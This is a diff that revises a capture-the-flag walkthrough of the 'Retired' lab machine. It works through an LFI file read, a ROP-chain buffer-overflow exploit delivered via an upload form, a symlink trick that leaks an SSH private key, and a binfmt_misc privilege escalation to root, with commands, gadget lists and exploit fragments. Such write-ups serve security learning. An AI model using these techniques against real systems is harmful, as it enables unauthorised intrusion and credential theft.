+PID 417 is our target: `/usr/bin/activate_license`. We pull the binary the same way as the PHP files:
 
 ```bash
 $ wget 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license' -O activate_license.b64
@@ -432,17 +424,17 @@ activate_license.b64                                                    [  <=>  
 $ cat activate_license.b64 | base64 -d > activate_license.bin
 ```
 
-Also, let's download other libs used by that program (libc and libsqlite) because they could be helpful in later stages.
+We also grab `libc-2.31.so` and `libsqlite3.so.0.8.6`, which will be useful when building the ROP chain.
 
-After opening the activate_license application in Ghidra, we can see that we can trigger a buffer overflow in the `activate_license()` function because there are no checks for message length:
+Opening the binary in Ghidra reveals an unbounded read inside `activate_license()`. The message length is taken from the wire and used as-is, so the stack buffer is overflowable:
 
 ![Activate_license program in Ghidra](ghidra.png)
 
-So right now, with that information, we're ready for the next stage.
+That gives us everything we need to start writing the exploit.
 
 ## Exploitation
 
-We need to check what security measures are compiled in binary. We can do it with the checksec tool:
+First, checksec on the binary:
 
 ```bash
 checksec ./activate_license.bin                                                                                                                                                                                   
@@ -454,7 +446,15 @@ checksec ./activate_license.bin
     PIE:      PIE enabled
 ```
 
-This and `randomize_va_space: 2` from the ruby script output means that: we have ASLR enabled - addresses are randomised every time program is started, there's Full RELRO, so we cant overwrite .plt or .got tables and NX bit protection - we can't execute code on stack unless we enable executable flag on that memory part. We can do it by calling `mprotect()` and changing memory flags to RWX for the whole stack. mprotect() call uses three arguments for address, size, and memory flags, so we must control `RDI`, `RSI`, and `RDX`. Here are POP / RET gadgets from the activate_license binary:
+Combined with `randomize_va_space: 2` from the ruby script earlier, this means:
+
+- ASLR is on, so library addresses change on every run
+- Full RELRO blocks us from overwriting `.plt` or `.got`
+- NX is on, so the stack is not executable
+- No stack canary, so the overflow is straight to saved RIP
+- PIE is on, so binary addresses are randomized too
+
+The plan is to flip the stack to RWX with `mprotect()` and then jump into shellcode placed right after the ROP chain. `mprotect(addr, len, flags)` takes three arguments, so we need to control `RDI`, `RSI`, and `RDX`. Available POP/RET gadgets inside the binary itself:
 
 ```bash
 ROPgadget --binary ./activate_license.bin --only "pop|ret"                                                                                                                                                      
@@ -477,7 +477,7 @@ Gadgets information
 0x000000000000175d : ret 0xb70f
 ```
 
-OK, we need more. First, let's see what's in the `libc` library:
+No `pop rdx` here. Checking libc:
 
 ```bash
 ROPgadget --binary ./libc-2.31.so --only "pop|ret"
@@ -509,7 +509,7 @@ Gadgets information
 (...)
 ```
 
-All required POP/RET gadgets are in libc, so we can use them from there: 
+All three gadgets are in libc:
 
 ```bash
 0x0000000000026796 : pop rdi ; ret
@@ -517,21 +517,21 @@ All required POP/RET gadgets are in libc, so we can use them from there:
 0x00000000000cb1cd : pop rdx ; ret
 ```
 
-Next, we need an offset of `mprotect()`. Again, we can get it with the readelf tool:
+We also need the offset of `mprotect()` inside libc, which `readelf` gives us:
 
 ```bash
 readelf -s libc-2.31.so | grep mprotect                                                                                                                                                                 
   1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5
 ```
 
-And the last gadget to execute our code on a stack is `JMP RSP` - it can be found in the `libsqlite` library:
+The last piece is a `jmp rsp` gadget to pivot onto the shellcode placed after the ROP chain. libsqlite has one:
 
 ```bash
 ROPgadget --binary ./libsqlite3.so.0.8.6 --only "jmp" | grep rsp                                                                                                                                                 
 0x00000000000d431d : jmp rsp
 ```
 
-We have gadgets, so let's write a script to help us get the padding size. First, we'll use the `cyclic_metasploit()` function from pwntools which generates the [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) (the Metasploit version):
+Before assembling the full chain, we need the offset from the start of the buffer to the saved RIP. pwntools' `cyclic_metasploit()` produces a De Bruijn sequence ([wiki](https://en.wikipedia.org/wiki/De_Bruijn_sequence)) we can spray into the input:
 
 ```bash
 #!/usr/bin/env python3
@@ -556,11 +556,11 @@ p.send(payload)
 p.interactive()
 ```
 
-Next, run the target binary in gdb (left pane on the screenshot below) and the above script (right pane):
+Running the binary under gdb (left pane) alongside the script (right pane) gives us a crash and a clean RIP value to look up in the pattern:
 
 ![Finding proper amount of padding](padding.png)
 
-We've got a match at the offset 520 in the generated pattern, so we must send 520 bytes of padding before our actual payload. With that information, we can start writing our exploit (at this moment, for localhost, we need to check if it's working correctly):
+The match is at offset 520, so we need 520 bytes of padding before the saved RIP. With that, we can write the exploit. First, a local-only version to confirm the chain itself works:
 
 ```python
 #!/usr/bin/env python3
@@ -639,11 +639,11 @@ p.send(fake_license)
 p.interactive()
 ```
 
-But first, test it and check if we can spawn a shell on localhost:
+Running it against a local copy:
 
 ![Testing exploit on localhost](test.png)
 
-Yup, we've got shell! Next, we need to get actual base addresses for the `activate_license` program on the remote host and put them in our script:
+Shell. Next we need the real library and stack base addresses on the remote host. Those come straight out of `/proc/417/maps` over the LFI. We patch them into the script and switch the network plumbing to deliver the payload through the upload form:
 
 ```python
 #!/usr/bin/env python3
@@ -718,19 +718,19 @@ log.info(f"Sending request to: {url}")
 requests.post(url, files = { "licensefile": payload } )
 ```
 
-Now we're ready to run it, and…
+Running it against the real target:
 
 ![Shell on remote host](shell.png)
 
-again, we've got a shell 😀
+We have a shell as `www-data`.
 
 ## Enumeration - part 2
 
-First, we need to check what potential vulnerabilities or holes in a configuration are on this host. We can check for non-standard SUID programs with find utility, but nothing unusual exists:
+A quick look for misconfigurations. No unusual SUID binaries:
 
 ```python
 www-data@retired:/var/www$ find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
-find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
+www-data@retired:/var/www$ find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
 -rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp
 -rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd
 -rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn
@@ -745,25 +745,25 @@ find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
 -rwsr-xr-x 1 root root 471K Mar 13  2021 /usr/lib/openssh/ssh-keysign
 ```
 
-Also, checking the system with [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) gives little more information. From the previous stage, we know that there is a `dev` user. Let's check his home directory. Unfortunately, we don't have enough permissions to check what's inside. The shell is spawned in `/var/www` directory for user `www-data`. After looking around, we can notice three ZIP files. They contain a backup of the `/var/www/html` directory, and they're done periodically every minute. We can exploit this behaviour in the next stage.
+[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) adds a little more context. We already know from the `/proc` walk that there is a `dev` user, but `/home/dev` is unreadable as `www-data`. Poking around `/var/www`, however, turns up three ZIP files. They are rolling backups of `/var/www/html`, regenerated every minute. That timer is the hinge for the next step.
 
 ## Lateral movement
 
-We've learned about users on the host from the previous stages, so the short escalation path will look like this: www-data → dev → root.
+The escalation path is **www-data → dev → root**.
 
-We can make a symlink attack - symlink `/home/dev` folder inside `/var/www/html`, so it will be archived by the backup script. After a few minutes (and a few tries), we've got `/home/dev` archived (the ZIP file size is different than other files). When we unpack it, we can get SSH private key for the `dev` user in `var/www/html/dev/.ssh` folder:
+We drop a symlink to `/home/dev` inside `/var/www/html`. The next backup run follows the symlink and archives `dev`'s home directory. After a few cycles the ZIP comes back noticeably larger than the others, and inside it is the SSH private key for `dev` at `var/www/html/dev/.ssh/id_rsa`:
 
 ![Private SSH key](id_rsa.png)
 
-After login in as a `dev` user, we see a user flag and a few folders created: `activate_license` and `emuemu`. 
+SSHing in as `dev` gives us the user flag and two interesting directories: `activate_license` and `emuemu`.
 
 ![Dev user home directory](dev.png)
 
-The first one contains sources of the activate_license program, and in the second one, there are two source files: `emuemu.c` and `reg_helper.c`. Emuemu.c is just a stub, but reg_helper.c is more interesting, as it contains a code which writes to `/proc/sys/fs/binfmt_misc/register`. According to `Makefile` reg_helper file is copied into `/usr/lib/emuemu/` folder. Also, it has capabilities: `cap_dac_override=ep` set, which bypasses file read, write, and execute permission checks.
+The first holds the source for the binary we just exploited. The second has two files: `emuemu.c` (a stub) and `reg_helper.c`. The latter is the interesting one. It writes to `/proc/sys/fs/binfmt_misc/register`. The `Makefile` installs `reg_helper` to `/usr/lib/emuemu/` and sets the `cap_dac_override=ep` capability on it, which lets the binary bypass file read, write, and execute permission checks.
 
 ![Contents of Makefile](makefile.png)
 
-Let's verify if it's installed.
+Confirming the install:
 
 ```python
 dev@retired:~$ find /usr -type f -name reg_helper -exec ls -alh {} \; 2>/dev/null
@@ -772,7 +772,7 @@ dev@retired:~$ find /usr -type f -name reg_helper -exec ls -alh {} \; 2>/dev/nul
 
 ## Privilege escalation
 
-There is an excellent post about binfmt_misc exploitation: [https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/), and we can use information from there to exploit binfmt_misc on this box. We reuse a simple interpreter from that article:
+There is a good write-up on abusing `binfmt_misc` for privilege persistence at [SentinelOne's blog](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/). The same idea applies here. We register a fake "interpreter" for a given binary pattern, then run a SUID binary that matches the pattern. The kernel invokes our interpreter under the SUID binary's effective UID, which is root. Our interpreter is a small C program that drops to UID 0 and exec's bash:
 
 ```c
 #include <sys/types.h>
@@ -787,16 +787,20 @@ int main(int argc, char * argv[], char * envp[])
 }
 ```
 
-Now, we can create a hex pattern for the binfmt_misc register with dd and Perl. I've picked a `su` program, but you can choose any other with the SUID attribute set. 
+We need the first 121 bytes of a SUID binary to use as the match pattern. `su` works, but any SUID binary with the same byte prefix will do:
 
 ```bash
 dd if=/bin/su bs=1 count=121 status=none | perl -pe 's/(.)/sprintf("\\x%02x", ord($1))/eg'
 ```
 
+Feeding the registration string into `reg_helper` registers our interpreter:
+
 ```bash
 echo ':x:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x38\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\xa8\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1d\x00\x1c\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03::/home/dev/i:OC' | /usr/lib/emuemu/reg_helper
 ```
 
-After sending the pattern with parameters to the reg_helper program, we can escalate our privileges to the root user by running our chosen SUID program:
+Now any execution of `su` is intercepted by our interpreter, which runs as root because `su` is SUID:
 
 ![Getting root](root.png)
+
+And that's root. The first three steps are pretty standard, but the `binfmt_misc` finish is the part of this box worth remembering.
